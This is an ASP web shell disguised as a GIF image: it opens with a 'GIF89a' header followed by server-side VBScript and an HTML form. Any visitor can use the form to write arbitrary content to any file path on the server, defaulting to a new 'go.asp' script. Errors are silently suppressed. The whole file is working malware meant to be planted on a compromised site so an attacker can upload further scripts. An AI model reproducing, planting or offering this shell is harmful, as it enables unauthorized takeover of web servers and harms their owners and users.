GIF89a$       ;<hTml>
<% 
on error resume next 
testfile=Request.form("filepath") 
msg=Request.form("message") 
if Trim(request("filepath"))<>"" then 
set fs=server.CreateObject("scripting.filesystemobject") 
set thisfile=fs.CreateTextFile(testfile,True) 
thisfile.Write(""&msg& "") 
if err =0 Then 
response.write "<font color=red>ok</font>" 
else 
response.write "<font color=red>no</font>" 
end if 
err.clear 
thisfile.close 
set fs = nothing 
End if 
%> 
<form method="POST" ACTION=""> 
<input type="text" size="20" name="filepath" 
value="<%=server.mappath("go.asp")%>"> <BR> 
<TEXTAREA NAME="Message" ROWS="5" COLS="40"></TEXTAREA> 
<input type="submit" name="Send" value="go"> 
</form></body></html></body></html> 
